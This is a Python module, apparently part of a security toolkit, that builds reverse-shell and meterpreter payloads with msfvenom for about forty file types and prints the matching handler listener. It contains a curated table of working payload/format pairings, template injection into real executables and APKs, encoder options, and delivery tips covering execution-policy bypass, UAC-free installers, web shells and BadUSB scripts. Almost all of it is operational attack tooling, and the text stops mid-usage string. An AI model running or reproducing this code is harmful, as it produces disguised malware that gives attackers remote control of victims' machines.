"""`/payload` — name an extension, get a payload that actually builds.

The command is a **table plus a subprocess**, and the table is the whole
feature. ``/payload apk`` does not ask a model what an APK payload looks like;
it looks the extension up, prints what that extension *is* and what will run
it, builds the exact ``msfvenom`` argv, runs it, and hands back the file plus
the listener that catches it. Deterministic, offline, and the same answer every
time — which is what you want from a command whose output is a binary you are
about to deliver.

**Every pairing in this table was measured on a real msfvenom, not recalled.**
That matters more than it sounds, because msfvenom's failure modes are quiet
and several of the obvious pairings do not work:

* **There is no ``-f apk``.** ``msfvenom -f apk`` answers
  ``Error: invalid format: apk``. The APK is produced by the *payload*
  (``android/meterpreter/reverse_tcp``) with no ``-f`` at all — the format is
  implied. A table written from memory gets this wrong and every APK build
  fails on the first run.
* **``-f elf-so`` needs a stageless payload.** ``linux/x64/meterpreter/
  reverse_tcp`` (staged) answers ``Error: selected payload can only generate
  ELF files``; ``linux/x64/meterpreter_reverse_tcp`` (stageless) builds. The
  same trap catches ``-f raw``.
* **``-f hta-psh`` overflows on a meterpreter payload.** The generated
  PowerShell exceeds the 8192-character command-line maximum and msfvenom
  refuses. A ``shell_reverse_tcp`` payload fits.
* **``-f js_be`` is refused for an x64 payload** — big-endian format, little-
  endian payload. ``js_le`` is the one that builds.
* **``-f java`` is only for non-Java payloads.** A ``java/*`` payload with
  ``-f java`` answers ``java is not a valid format for Java payloads``.
* **``-f axis2`` needs a Java payload** — ``java/jsp_shell_reverse_tcp`` is
  rejected as "not a Java payload"; ``java/meterpreter_reverse_tcp`` works.

So the table records the pairing that was *observed to build*, and each entry
carries the caveat that made it non-obvious. A test pins the traps, because
they are exactly the kind of thing a later "cleanup" would reintroduce.

**Template injection is checked, not assumed.** ``-x <file>`` embeds the
payload in an existing artifact, which is the difference between a payload and
a payload that looks like the thing it is pretending to be. It works for PE
(``-x app.exe -k``) and it does **not** work for APK on a host whose apktool is
older than 2.9.2 — msfvenom says so plainly, and this module checks the version
before offering it rather than letting the build fail after a minute of work.

Nothing here sends, connects, or resolves anything. The only network-shaped
value is ``LHOST``, which is the operator's own listener address; it is
defaulted from the local routing table so the common case needs no flag, and it
is never contacted. The payload is written to a case directory under
``<state_dir>/payload/`` and the listener is printed as an ``.rc`` file beside
it.

No Textual, no colours, no model — the same split as ``osint.py`` and
``reverse.py``, so the whole thing is testable without a terminal or an API key.
"""

from __future__ import annotations

import hashlib
import os
import re
import shutil
import socket
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path

from .reverse import human_size

#: How long a build may take. An APK is the slow one — it unpacks, patches and
#: repacks a template — and a cold one on a slow disk has been seen past 60s.
#: A build that exceeds this is abandoned rather than left to hang the caller.
BUILD_TIMEOUT = 300.0

#: The listener every entry here uses. Recorded once because it is the same
#: module for all of them: what differs is the payload name it is told to
#: catch, and that comes from the spec.
LISTENER = "exploit/multi/handler"

#: Default port. 4444 is the convention every cheat sheet and every handler
#: example uses, so it is the one that needs no explanation.
DEFAULT_LPORT = 4444


# ---------------------------------------------------------------------------
# the table
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class Spec:
    """One extension, and everything needed to build and catch a payload for it.

    ``format`` is the ``-f`` value, or ``None`` when the payload implies the
    container and passing ``-f`` would be an error — which is the APK case and
    the reason this field is optional rather than a string with a sentinel.
    """

    ext: str
    label: str
    #: What runs the artifact, in the operator's terms. This is the "analyse"
    #: half of the command: an extension is not a format, and knowing that
    #: ``.hta`` is executed by mshta on Windows is what decides whether the
    #: payload is the right one for the target.
    runs_on: str
    #: ``-f`` value, or None to omit it entirely.
    format: str | None
    #: The default payload id. Chosen for reliability on the target, not for
    #: features: a stageless payload where staged is fragile, a shell where
    #: meterpreter would overflow a length limit.
    payload: str
    #: Other payload ids that also build for this format, best first. Offered
    #: by ``--payload`` and listed in the analysis so the operator can see the
    #: alternatives without consulting a cheat sheet.
    alternatives: tuple[str, ...] = ()
    #: Caveats that are true of this pairing specifically. Printed with the
    #: analysis, because a trap the operator meets after the build is a trap
    #: that cost them the build.
    notes: tuple[str, ...] = ()
    #: Whether ``-x <template>`` is worth offering. False where msfvenom
    #: refuses it or where the result is not meaningfully disguised.
    template_ok: bool = False
    #: Whether ``-k`` (run the payload as a new thread in the template) is
    #: meaningful. Only PE has ever been reliable with it.
    keep_template: bool = False


#: The registry. Keyed by extension without the dot.
#:
#: Ordered roughly by how often it is wanted rather than alphabetically, so
#: ``/payload`` with no argument reads as a priority list rather than a dump.
SPECS: dict[str, Spec] = {
    # ---- Android ---------------------------------------------------------
    "apk": Spec(
        ext="apk",
        label="Android package",
        runs_on="Android 4.0+ (dalvik), installed by the user or a sideload",
        # No `-f`: `msfvenom -f apk` is `Error: invalid format: apk`. The
        # payload produces the APK container itself.
        format=None,
        payload="android/meterpreter/reverse_tcp",
        alternatives=(
            "android/meterpreter/reverse_https",
            "android/meterpreter_reverse_tcp",
            "android/shell/reverse_tcp",
        ),
        notes=(
            "no `-f` — the payload emits the APK; `-f apk` is an error",
            "the build is signed with a debug key, so it installs but is "
            "obviously self-signed",
            "`-x <template.apk>` needs apktool >= 2.9.2; older versions refuse",
        ),
        template_ok=True,
    ),
    # ---- Windows ---------------------------------------------------------
    "exe": Spec(
        ext="exe",
        label="Windows executable",
        runs_on="Windows (x64), executed directly by the user",
        format="exe",
        payload="windows/x64/meterpreter/reverse_tcp",
        alternatives=(
            "windows/x64/meterpreter_reverse_https",
            "windows/x64/shell_reverse_tcp",
            "windows/meterpreter/reverse_tcp",
        ),
        notes=(
            "`-x <template.exe> -k` embeds it in a real binary and runs the "
            "payload as a new thread",
            "`-f exe-service` builds a service binary instead",
        ),
        template_ok=True,
        keep_template=True,
    ),
    "dll": Spec(
        ext="dll",
        label="Windows DLL",
        runs_on="Windows (x64), loaded by a host process or rundll32",
        format="dll",
        payload="windows/x64/meterpreter/reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
        notes=("needs a loader or `rundll32` — a DLL does not run by itself",),
    ),
    "msi": Spec(
        ext="msi",
        label="Windows installer",
        runs_on="Windows, installed by msiexec — no admin prompt for a "
                "per-user install",
        format="msi",
        payload="windows/x64/meterpreter/reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
        notes=(
            "`-f msi-nouac` drops the UAC prompt, at the cost of a per-user "
            "install",
            "the MSI carries a visible product name and publisher — set them "
            "with a template if that matters",
        ),
    ),
    "ps1": Spec(
        ext="ps1",
        label="PowerShell script",
        runs_on="Windows PowerShell 2.0+, executed by the user or by a "
                "policy that allows it",
        format="psh-reflection",
        payload="windows/x64/meterpreter/reverse_tcp",
        alternatives=(
            "windows/x64/shell_reverse_tcp",
        ),
        notes=(
            "`-f psh-cmd` and `-f psh-net` build the other two shapes",
            "execution policy blocks a bare `.ps1` by default — the delivery "
            "is usually `powershell -ep bypass -f`",
        ),
    ),
    "hta": Spec(
        ext="hta",
        label="HTML Application",
        runs_on="Windows, executed by mshta.exe from a link or a file",
        format="hta-psh",
        # Deliberately a shell payload: a meterpreter payload overflows the
        # 8192-character command line and msfvenom refuses to build.
        payload="windows/x64/shell_reverse_tcp",
        alternatives=("windows/x64/meterpreter/reverse_tcp",),
        notes=(
            "a meterpreter payload overflows the 8192-char command line — "
            "this entry uses a shell payload for that reason",
            "mshta is blocked by most EDR; it is a delivery test, not a "
            "stealth one",
        ),
    ),
    "vbs": Spec(
        ext="vbs",
        label="VBScript",
        runs_on="Windows, executed by wscript.exe or cscript.exe",
        format="vbs",
        payload="windows/x64/shell_reverse_tcp",
        alternatives=("windows/x64/meterpreter/reverse_tcp",),
        notes=("`-f loop-vbs` builds a variant that re-executes on failure",),
    ),
    "vba": Spec(
        ext="vba",
        label="VBA macro",
        runs_on="Microsoft Office, pasted into a document's macro editor",
        format="vba",
        payload="windows/x64/shell_reverse_tcp",
        alternatives=("windows/x64/meterpreter/reverse_tcp",),
        notes=(
            "`-f vba-psh` wraps it in a PowerShell stager; `-f vba-exe` "
            "produces a dropper that writes an exe",
            "Office blocks macros from the internet by default — this is a "
            "document the target has to enable",
        ),
    ),
    "bat": Spec(
        ext="bat",
        label="Windows batch file",
        runs_on="Windows, executed by cmd.exe",
        format="raw",
        payload="cmd/windows/reverse_powershell",
        alternatives=(),
        notes=("the output is a one-line PowerShell invocation, not a "
               "self-contained script",),
    ),
    # ---- Linux / Unix ----------------------------------------------------
    "elf": Spec(
        ext="elf",
        label="Linux ELF binary",
        runs_on="Linux (x64), executed directly — needs the exec bit",
        format="elf",
        # Stageless: the staged variant is fine for `-f elf` but the same
        # payload id is reused for `-f elf-so`, where staged is refused.
        payload="linux/x64/meterpreter_reverse_tcp",
        alternatives=(
            "linux/x64/shell_reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
        ),
        notes=("`chmod +x` before it will run",),
    ),
    "so": Spec(
        ext="so",
        label="Linux shared object",
        runs_on="Linux (x64), loaded by a host process via LD_PRELOAD or dlopen",
        format="elf-so",
        # Staged, not stageless. A stageless meterpreter payload
        # (`linux/x64/meterpreter_reverse_tcp`) answers "selected payload can
        # only generate ELF files" for `-f elf-so`; the staged id builds.
        payload="linux/x64/meterpreter/reverse_tcp",
        alternatives=("linux/x64/shell_reverse_tcp",),
        notes=(
            "a stageless meterpreter payload is refused for `-f elf-so` — "
            "this entry is staged for that reason",
            "needs a loader: LD_PRELOAD, dlopen, or a hijacked library path",
        ),
    ),
    "sh": Spec(
        ext="sh",
        label="POSIX shell script",
        runs_on="Linux / Unix, executed by sh or bash",
        format="raw",
        payload="cmd/unix/reverse_bash",
        alternatives=("cmd/unix/reverse_perl", "cmd/unix/reverse_python"),
        notes=(
            "uses bash's /dev/tcp — not available on a shell built without it",
            "`-f sh` wraps the same payload in a `sh -c` invocation",
        ),
    ),
    "pl": Spec(
        ext="pl",
        label="Perl script",
        runs_on="Any host with perl — the most portable of the script payloads",
        format="raw",
        payload="cmd/unix/reverse_perl",
        alternatives=(),
        notes=("perl is present on almost every Unix by default",),
    ),
    "py": Spec(
        ext="py",
        label="Python script",
        runs_on="Any host with python3",
        format="raw",
        payload="python/meterpreter_reverse_tcp",
        alternatives=("python/shell_reverse_tcp",),
        notes=(
            "the meterpreter payload is a base64+zlib blob — it runs, but it "
            "does not read as Python",
            "`-f python` emits a shellcode array instead, for embedding",
        ),
    ),
    "rb": Spec(
        ext="rb",
        label="Ruby script",
        runs_on="Any host with ruby",
        format="raw",
        payload="ruby/shell_reverse_tcp",
        alternatives=(),
        notes=("`-f ruby` emits a shellcode array instead, for embedding",),
    ),
    "js": Spec(
        ext="js",
        label="Node.js script",
        runs_on="Any host with node — a server, a build box, an Electron app",
        format="raw",
        payload="nodejs/shell_reverse_tcp",
        alternatives=("nodejs/shell_reverse_tcp_ssl",),
        notes=(
            "`-f js_le` emits shellcode for a browser context; `-f js_be` is "
            "refused for an x64 payload",
        ),
    ),
    "lua": Spec(
        ext="lua",
        label="Lua script",
        runs_on="Any host with a Lua interpreter — game engines, embedded "
                "devices, some routers",
        format="raw",
        payload="cmd/unix/reverse_lua",
        alternatives=(),
    ),
    # ---- macOS -----------------------------------------------------------
    "macho": Spec(
        ext="macho",
        label="macOS Mach-O binary",
        runs_on="macOS (x64), executed directly — Gatekeeper will quarantine "
                "a downloaded one",
        format="macho",
        payload="osx/x64/meterpreter_reverse_tcp",
        alternatives=("osx/x64/shell_reverse_tcp",),
        notes=(
            "an unsigned binary is killed on launch unless the quarantine "
            "attribute is cleared",
            "`-f osx-app` builds a .app bundle instead",
        ),
    ),
    "dylib": Spec(
        ext="dylib",
        label="macOS dynamic library",
        runs_on="macOS (x64), loaded by a host process via DYLD_INSERT_LIBRARIES",
        format="macho",
        payload="osx/x64/shell_reverse_tcp",
        alternatives=("osx/x64/meterpreter_reverse_tcp",),
        notes=("needs a loader — DYLD_INSERT_LIBRARIES or a hijacked path",),
    ),
    "app": Spec(
        ext="app",
        label="macOS application bundle",
        runs_on="macOS (x64), double-clicked — a directory, not a file",
        format="osx-app",
        payload="osx/x64/shell_reverse_tcp",
        # Staged: a stageless meterpreter payload is refused for `-f osx-app`
        # with "can only generate MACHO files".
        alternatives=("osx/x64/meterpreter/reverse_tcp",),
        notes=("the output is a bundle directory, so `-o` names a directory",),
    ),
    # ---- Java ------------------------------------------------------------
    "jar": Spec(
        ext="jar",
        label="Java archive",
        runs_on="Any host with a JRE — `java -jar`",
        format="jar",
        payload="java/meterpreter_reverse_tcp",
        alternatives=("java/shell_reverse_tcp",),
        notes=(
            "`-f java` is refused for a java/* payload — the jar is the "
            "container",
            "a signed jar cannot be modified without re-signing",
        ),
    ),
    "war": Spec(
        ext="war",
        label="Java web archive",
        runs_on="A servlet container — Tomcat, Jetty, WildFly",
        format="war",
        payload="java/jsp_shell_reverse_tcp",
        alternatives=("java/meterpreter_reverse_tcp",),
        notes=("deploying it needs a manager account or a writable "
               "deployment directory",),
    ),
    "jsp": Spec(
        ext="jsp",
        label="JSP web shell",
        runs_on="A servlet container, fetched over HTTP",
        format="raw",
        payload="java/jsp_shell_reverse_tcp",
        alternatives=("java/meterpreter_reverse_tcp",),
        notes=("needs a write primitive on the webroot to land",),
    ),
    "axis2": Spec(
        ext="axis2",
        label="Axis2 service archive",
        runs_on="An Apache Axis2 deployment",
        format="axis2",
        # `java/jsp_shell_reverse_tcp` is rejected here as "not a Java
        # payload"; the meterpreter id is the one that builds.
        payload="java/meterpreter_reverse_tcp",
        alternatives=(),
        notes=("`-f axis2` needs a java/* payload — a jsp payload is refused",),
    ),
    # ---- Web -------------------------------------------------------------
    "aspx": Spec(
        ext="aspx",
        label="ASP.NET web shell",
        runs_on="IIS with ASP.NET, fetched over HTTP",
        format="aspx",
        payload="windows/x64/meterpreter/reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
        notes=(
            "`-f aspx-exe` builds a dropper that writes an exe instead",
            "needs a write primitive on the webroot to land",
        ),
    ),
    "asp": Spec(
        ext="asp",
        label="Classic ASP web shell",
        runs_on="IIS with classic ASP enabled, fetched over HTTP",
        format="asp",
        payload="windows/x64/shell_reverse_tcp",
        alternatives=("windows/x64/meterpreter/reverse_tcp",),
        notes=("classic ASP is disabled by default on modern IIS",),
    ),
    "php": Spec(
        ext="php",
        label="PHP web shell",
        runs_on="Any PHP interpreter — a webroot, a CLI, a plugin",
        format="raw",
        payload="php/meterpreter_reverse_tcp",
        alternatives=("php/reverse_php",),
        notes=(
            "the meterpreter payload is a base64 blob wrapped in a comment — "
            "it runs, but it does not read as PHP",
            "`php/reverse_php` is the readable one-liner",
        ),
    ),
    # ---- Source / shellcode ---------------------------------------------
    "c": Spec(
        ext="c",
        label="C shellcode array",
        runs_on="Compiled into a loader — not runnable on its own",
        format="c",
        payload="windows/x64/meterpreter/reverse_tcp",
        alternatives=("linux/x64/shell_reverse_tcp",),
        notes=("this is shellcode as a C literal; it needs a loader to run",),
    ),
    "cs": Spec(
        ext="cs",
        label="C# shellcode array",
        runs_on="Compiled with csc, or run through Add-Type in PowerShell",
        format="csharp",
        payload="windows/x64/shell_reverse_tcp",
        alternatives=("windows/x64/meterpreter/reverse_tcp",),
        notes=("`Add-Type` in PowerShell runs it without a compiler on disk",),
    ),
    "go": Spec(
        ext="go",
        label="Go source",
        runs_on="Compiled with `go build` — cross-compiles to any target",
        format="go",
        payload="linux/x64/shell_reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
        notes=("`-f golang` is the same format under its other name",),
    ),
    "nim": Spec(
        ext="nim",
        label="Nim source",
        runs_on="Compiled with `nim c`",
        format="nim",
        payload="linux/x64/shell_reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
        notes=("`-f nimlang` is the same format under its other name",),
    ),
    "rs": Spec(
        ext="rs",
        label="Rust source",
        runs_on="Compiled with `rustc` or `cargo`",
        format="rust",
        payload="linux/x64/shell_reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
        notes=("`-f rustlang` is the same format under its other name",),
    ),
    "zig": Spec(
        ext="zig",
        label="Zig source",
        runs_on="Compiled with `zig build-exe`",
        format="zig",
        payload="linux/x64/shell_reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
    ),
    "asm": Spec(
        ext="asm",
        label="MASM assembly",
        runs_on="Assembled with MASM — Windows only",
        format="masm",
        payload="windows/x64/shell_reverse_tcp",
        alternatives=(),
    ),
    "bin": Spec(
        ext="bin",
        label="raw shellcode",
        runs_on="Whatever loads it — a loader, an exploit, a stager",
        format="raw",
        # Staged, for the same reason as `so`: a stageless meterpreter payload
        # is refused for `-f raw` with "can only generate ELF files".
        payload="linux/x64/meterpreter/reverse_tcp",
        alternatives=("linux/x64/shell_reverse_tcp",),
        notes=(
            "a stageless meterpreter payload is refused for `-f raw` — this "
            "entry is staged for that reason",
            "raw bytes have no header, so nothing identifies them as a payload",
        ),
    ),
    "b64": Spec(
        ext="b64",
        label="base64-encoded payload",
        runs_on="Decoded and executed by whatever runs it",
        format="base64",
        payload="linux/x64/shell_reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
        notes=("`-f base32` and `-f hex` are the same idea in other alphabets",),
    ),
    "hex": Spec(
        ext="hex",
        label="hex-encoded payload",
        runs_on="Decoded and executed by whatever runs it",
        format="hex",
        payload="linux/x64/shell_reverse_tcp",
        alternatives=("windows/x64/shell_reverse_tcp",),
    ),
    "txt": Spec(
        ext="txt",
        label="Ducky Script",
        runs_on="A USB Rubber Ducky or a compatible BadUSB device",
        format="ducky-script-psh",
        payload="windows/x64/shell_reverse_tcp",
        alternatives=(),
        notes=("this is a keystroke script for a hardware device, not a file "
               "the target opens",),
    ),
}

#: Names an operator will type that are not extensions. Kept separate from
#: SPECS so the table stays one row per buildable format, and so an alias can
#: never shadow a real extension.
ALIASES: dict[str, str] = {
    "android": "apk",
    "windows": "exe",
    "win": "exe",
    "linux": "elf",
    "unix": "sh",
    "bash": "sh",
    "shell": "sh",
    "macos": "macho",
    "osx": "macho",
    "mac": "macho",
    "powershell": "ps1",
    "pwsh": "ps1",
    "python": "py",
    "python3": "py",
    "ruby": "rb",
    "perl": "pl",
    "node": "js",
    "nodejs": "js",
    "batch": "bat",
    "cmd": "bat",
    "macro": "vba",
    "office": "vba",
    "shellcode": "bin",
    "raw": "bin",
    "java": "jar",
    "dotnet": "cs",
    "csharp": "cs",
    "golang": "go",
    "rustlang": "rs",
    "nimlang": "nim",
    "base64": "b64",
    "ducky": "txt",
    "rubberducky": "txt",
    "shared": "so",
    "web": "php",
}

#: The order `/payload` with no argument lists them in. Grouped by target
#: rather than alphabetically, because "what can I build for Android" is the
#: question, not "what starts with a".
LIST_ORDER: tuple[str, ...] = (
    "apk",
    "exe", "dll", "msi", "ps1", "hta", "vbs", "vba", "bat",
    "elf", "so", "sh", "pl", "py", "rb", "js", "lua",
    "macho", "dylib", "app",
    "jar", "war", "jsp", "axis2",
    "aspx", "asp", "php",
    "c", "cs", "go", "nim", "rs", "zig", "asm", "bin", "b64", "hex", "txt",
)


def resolve(token: str) -> Spec | None:
    """The spec for *token*, or None.

    Accepts an extension with or without the dot, a filename whose extension
    is known, or one of the aliases. A filename is unwrapped rather than
    rejected because ``/payload app.apk`` is what an operator types when they
    are looking at the file they want to imitate.
    """
    if not token:
        return None
    raw = token.strip().strip("\"'").lower()
    if not raw:
        return None

    # A path or a filename: take its extension.
    if "/" in raw or "\\" in raw:
        raw = raw.replace("\\", "/").rsplit("/", 1)[-1]
    if "." in raw and not raw.startswith("."):
        raw = raw.rsplit(".", 1)[-1]
    raw = raw.lstrip(".")

    if raw in SPECS:
        return SPECS[raw]
    alias = ALIASES.get(raw)
    if alias:
        return SPECS.get(alias)
    return None


def extensions() -> list[str]:
    """Every buildable extension, in listing order."""
    return [e for e in LIST_ORDER if e in SPECS]


# ---------------------------------------------------------------------------
# host probing
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class Tool:
    """One external program, and whether this host has it."""

    name: str
    path: str | None
    version: str = ""

    @property
    def present(self) -> bool:
        return self.path is not None


def probe_msfvenom() -> Tool:
    """Whether msfvenom resolves, and what it says its version is.

    ``msfvenom --version`` answers ``version unknown`` on a distro build, which
    is not a failure — the binary works. So the version is recorded as text and
    never parsed into a comparison; only presence decides anything.
    """
    path = shutil.which("msfvenom")
    if path is None:
        return Tool("msfvenom", None)
    try:
        out = subprocess.run(
            [path, "--version"], capture_output=True, text=True, timeout=30,
        )
        version = (out.stdout or out.stderr or "").strip().splitlines()
        return Tool("msfvenom", path, version[0] if version else "")
    except (OSError, subprocess.SubprocessError):
        return Tool("msfvenom", path)


def probe_apktool() -> Tool:
    """Whether apktool resolves, and its version.

    Only consulted for APK template injection, which msfvenom refuses below
    2.9.2. The version string is parsed here because that comparison is the
    whole point of the probe — unlike msfvenom's, which is informational.
    """
    path = shutil.which("apktool")
    if path is None:
        return Tool("apktool", None)
    try:
        out = subprocess.run(
            [path, "--version"], capture_output=True, text=True, timeout=30,
        )
        text = (out.stdout or out.stderr or "").strip().splitlines()
        return Tool("apktool", path, text[0] if text else "")
    except (OSError, subprocess.SubprocessError):
        return Tool("apktool", path)


_VERSION_RE = re.compile(r"(\d+)\.(\d+)\.(\d+)")


def apktool_supports_template(tool: Tool | None = None) -> tuple[bool, str]:
    """Whether APK template injection will work here. Returns (ok, reason).

    msfvenom's own check is ``>= 2.9.2``, and it fails the build rather than
    degrading — so this is asked *before* the build, and the answer is printed
    with the analysis. A distro apktool is routinely older than that: 2.7.0 is
    what Debian ships, and it is what this was measured against.
    """
    tool = tool or probe_apktool()
    if not tool.present:
        return False, "apktool is not installed"
    m = _VERSION_RE.search(tool.version)
    if not m:
        return False, f"apktool version unreadable ({tool.version or 'no output'})"
    major, minor, patch = (int(g) for g in m.groups())
    if (major, minor, patch) < (2, 9, 2):
        return False, (
            f"apktool {major}.{minor}.{patch} is older than 2.9.2, which "
            "msfvenom requires for APK templates"
        )
    return True, f"apktool {major}.{minor}.{patch}"


def default_lhost() -> str:
    """This host's outbound address, for the common case.

    A UDP socket that is never sent on: ``connect`` on UDP only sets the
    default route, so this asks the routing table which interface would be
    used without putting a packet on the wire. Falls back to the loopback
    address, which is the honest answer when there is no route — a payload
    pointing at 127.0.0.1 is obviously wrong, and that is better than a
    plausible-looking address that is also wrong.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# building
# ---------------------------------------------------------------------------


@dataclass
class Build:
    """One payload build: the argv, and what came back."""

    spec: Spec
    argv: list[str]
    out: Path
    lhost: str
    lport: int
    payload: str
    ok: bool = False
    size: int = 0
    sha256: str = ""
    stdout: str = ""
    stderr: str = ""
    seconds: float = 0.0
    error: str = ""

    @property
    def command(self) -> str:
        """The argv as a copy-pasteable line, quoted where it needs to be."""
        return " ".join(_quote(a) for a in self.argv)


def _quote(arg: str) -> str:
    """Shell-quote one argv element, only when it needs it."""
    if not arg:
        return "''"
    if re.fullmatch(r"[A-Za-z0-9_@%+=:,./-]+", arg):
        return arg
    return "'" + arg.replace("'", "'\\''") + "'"


def build_argv(
    spec: Spec,
    *,
    lhost: str,
    lport: int,
    out: Path,
    payload: str | None = None,
    encoder: str | None = None,
    iterations: int | None = None,
    bad_chars: str | None = None,
    template: Path | None = None,
    extra: list[str] | None = None,
) -> list[str]:
    """The exact msfvenom argv for *spec*.

    Split out from :func:`generate` so the command can be printed without
    running it — ``--dry-run`` is the flag that makes this command safe to
    point at a format you are unsure of, and it is only honest if it prints the
    same argv the real run would use.

    ``-f`` is omitted entirely when ``spec.format`` is None. That is the APK
    case and it is not cosmetic: ``msfvenom -f apk`` is an error.
    """
    argv = [
        "msfvenom",
        "-p", payload or spec.payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
    ]
    if spec.format:
        argv += ["-f", spec.format]
    if encoder:
        argv += ["-e", encoder]
        if iterations:
            argv += ["-i", str(iterations)]
    if bad_chars:
        argv += ["-b", bad_chars]
    if template is not None:
        argv += ["-x", str(template)]
        if spec.keep_template:
            argv += ["-k"]
    if extra:
        argv += list(extra)
    argv += ["-o", str(out)]
    return argv


def generate(
    spec: Spec,
    *,
    lhost: str,
    lport: int,
    out: Path,
    payload: str | None = None,
    encoder: str | None = None,
    iterations: int | None = None,
    bad_chars: str | None = None,
    template: Path | None = None,
    extra: list[str] | None = None,
    timeout: float = BUILD_TIMEOUT,
) -> Build:
    """Run the build and describe what happened.

    Never raises for a build that failed: msfvenom's own message is the useful
    part, and it is captured into ``stderr`` and surfaced. A missing binary is
    the one case checked up front, because "msfvenom is not installed" is a
    different problem from "this pairing does not build" and the operator
    should not have to read a traceback to tell them apart.
    """
    argv = build_argv(
        spec, lhost=lhost, lport=lport, out=out, payload=payload,
        encoder=encoder, iterations=iterations, bad_chars=bad_chars,
        template=template, extra=extra,
    )
    build = Build(
        spec=spec, argv=argv, out=Path(out), lhost=lhost, lport=lport,
        payload=payload or spec.payload,
    )

    tool = probe_msfvenom()
    if not tool.present:
        build.error = (
            "msfvenom is not installed — it ships with the Metasploit "
            "Framework (apt install metasploit-framework)"
        )
        return build

    started = time.monotonic()
    try:
        proc = subprocess.run(
            argv, capture_output=True, text=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        build.seconds = time.monotonic() - started
        build.error = f"the build did not finish within {timeout:.0f}s"
        return build
    except OSError as exc:
        build.seconds = time.monotonic() - started
        build.error = f"could not run msfvenom: {exc}"
        return build

    build.seconds = time.monotonic() - started
    build.stdout = proc.stdout or ""
    build.stderr = proc.stderr or ""

    # msfvenom exits 0 on success, but the file is the real evidence: a build
    # that reported success and wrote nothing is a failure, and checking the
    # exit code alone would call it a win.
    path = Path(out)
    if proc.returncode != 0:
        build.error = _first_error(build.stderr or build.stdout) or (
            f"msfvenom exited {proc.returncode}")
        return build
    if not path.exists():
        build.error = "msfvenom reported success but wrote no file"
        return build
    if path.is_file() and path.stat().st_size == 0:
        build.error = "msfvenom wrote an empty file"
        return build

    build.ok = True
    if path.is_file():
        build.size = path.stat().st_size
        build.sha256 = _sha256(path)
    else:
        # A bundle (`-f osx-app`) is a directory; size is the tree's total.
        build.size = sum(p.stat().st_size for p in path.rglob("*")
                         if p.is_file())
    return build


def _first_error(text: str) -> str:
    """The first line that reads as an error, for a one-line report.

    msfvenom prefixes *informational* lines with ``[-]`` as well as errors —
    "No platform was selected, choosing …" is a note, not a failure — so a
    naive ``[-]`` match reports the wrong line and hides the real one. Only
    ``Error:`` and ``[-] Error`` count here; the caller already knows the exit
    code was non-zero, so this is picking the message, not deciding the verdict.
    """
    for line in (text or "").splitlines():
        stripped = line.strip()
        low = stripped.lower()
        if low.startswith("error:"):
            return stripped[len("error:"):].strip()
        if low.startswith("[-] error"):
            return stripped[len("[-] error"):].strip()
    return ""


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as fh:
        for chunk in iter(lambda: fh.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


# ---------------------------------------------------------------------------
# the listener
# ---------------------------------------------------------------------------


def handler_rc(spec: Spec, lhost: str, lport: int,
               payload: str | None = None) -> str:
    """The msfconsole resource file that catches this payload.

    ``ExitOnSession false`` and ``exploit -j`` are both there for the same
    reason: a handler that exits after the first session means a second target
    needs a second console, and the whole point of a handler is that it is
    already listening.
    """
    return (
        f"use {LISTENER}\n"
        f"set payload {payload or spec.payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        f"set ExitOnSession false\n"
        f"exploit -j\n"
    )


# ---------------------------------------------------------------------------
# case directory
# ---------------------------------------------------------------------------

_SLUG_RE = re.compile(r"[^a-zA-Z0-9._-]+")


def case_dir(cfg, spec: Spec) -> Path:
    """Create and return this build's directory.

    ``<state_dir>/payload/<ext>-<stamp>/`` — beside the osint cases, the hunt
    campaigns and the crack runs, under state_dir so a payload lands with the
    session state rather than in whatever repo the operator happens to be in.
    A payload in a git checkout is a payload that gets committed.
    """
    stamp = time.strftime("%Y%m%d-%H%M%S")
    label = _SLUG_RE.sub("-", spec.ext).strip("-.") or "payload"
    d = Path(cfg.state_dir) / "payload" / f"{label}-{stamp}"
    d.mkdir(parents=True, exist_ok=True)
    return d


def output_name(spec: Spec, payload: str | None = None) -> str:
    """The filename a build writes.

    Named after the extension rather than the payload id, because the file is
    what gets delivered and ``payload.apk`` is what an operator expects to
    find. The payload id is in the analysis and in the handler, where it
    matters.
    """
    return f"payload.{spec.ext}"


# ---------------------------------------------------------------------------
# usage
# ---------------------------------------------------------------------------

USAGE_LINES: tuple[tuple[str, str], ...] = (
    ("/payload <ext>",
     "analyse the extension, build a payload, print the listener"),
    ("/payload <ext> --dry-run",
     "print the exact msfvenom command, build nothing"),
    ("/payload <ext> --handler",
     "print only the msfconsole listener"),
    ("/payload <ext> --lhost IP --lport N",
     "set the callback address (LHOST defaults to this host's)"),
    ("/payload <ext> --payload ID",
     "use a different payload id for the same format"),
    ("/payload <ext> --encoder E --iterations N",
     "encode the payload, e.g. x64/xor_dynamic"),
    ("/payload <ext> --bad-chars '\\x00\\x0a'",
     "exclude bytes the target cannot carry"),
    ("/payload <ext> --template FILE",
     "embed the payload in an existing artifact"),
    ("/payload <ext> --out PATH",
     "write somewhere other than the case directory"),
    ("/payload",
     "list every extension this can build"),
)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

_USAGE = """\
/payload — build a payload for a file extension.

  python -m zimzilla.payload list
  python -m zimzilla.payload <ext> [--lhost IP] [--lport N] [--dry-run]
  python -m zimzilla.payload <ext> --handler

Every pairing in the table was measured against a real msfvenom. See
